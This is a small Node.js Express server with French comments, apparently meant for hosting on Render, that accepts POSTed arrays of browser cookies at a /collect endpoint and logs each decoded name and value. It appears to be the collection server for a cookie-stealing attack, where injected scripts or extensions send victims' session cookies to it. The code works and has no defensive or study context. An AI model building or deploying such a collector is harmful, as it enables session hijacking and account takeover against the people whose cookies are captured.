const express = require('express');
const app = express();

// Render définit automatiquement un port, on doit l'utiliser ou prendre le 3000 par défaut
const PORT = process.env.PORT || 3000;

// Middleware indispensable pour lire le JSON envoyé dans la requête (req.body)
app.use(express.json());

app.post("/collect", (req, res) => {
  const cookies = req.body.cookies;

  console.log("\n===== COOKIES REÇUS =====\n");

  if (!Array.isArray(cookies)) {
    console.log("❌ cookies n'est pas un tableau !");
    return res.status(400).json({ status: "error", message: "Cookies must be an array" });
  }

  cookies.forEach(cookie => {
    console.log(`${cookie.name}: ${decodeURIComponent(cookie.value)}`);
  });

  console.log("\n=========================\n");

  res.json({ status: "ok" });
});

// Indispensable : dire au serveur d'écouter les connexions
app.listen(PORT, () => {
  console.log(`Serveur en ligne sur le port ${PORT}`);
});
